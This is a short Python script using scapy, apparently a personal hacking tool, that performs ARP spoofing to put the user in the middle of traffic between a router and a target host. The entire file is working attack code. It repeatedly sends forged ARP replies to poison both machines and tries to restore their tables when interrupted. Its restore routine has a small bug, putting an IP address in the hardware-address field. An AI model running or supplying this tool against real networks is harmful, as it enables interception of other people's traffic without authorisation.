#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Author: Isaac Privett
#Date: 05-03-2022
#Description: Program to spoof the router MAC address and MITM a target host

import scapy.all as scapy

def restore(destination_ip, source_ip):
	target_mac = get_target_mac(destination_ip)
	source_mac = get_target_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=source_ip, hwsrc=source_mac)
	scapy.send(packet, verbose=False)

def get_target_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	finalpacket = broadcast/arp_request
	answer = scapy.srp(finalpacket, timeout=3, verbose=False)[0]	
	mac = answer[0][1].hwsrc
	return mac
	

def spoof_arp(target_ip, spoofed_ip):
	mac = get_target_mac(target_ip)
	packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
	scapy.send(packet, verbose=False)

def main():
	router_ip = input("[*] Enter router IP address: ")
	target_ip = input("[*] Enter target host IP address: ")
	try:
		while True:
			spoof_arp(router_ip, target_ip)
			spoof_arp(target_ip, router_ip)
			
	except KeyboardInterrupt:
		restore(router_ip,target_ip)
		restore(target_ip,router_ip)
		exit(0)

main()
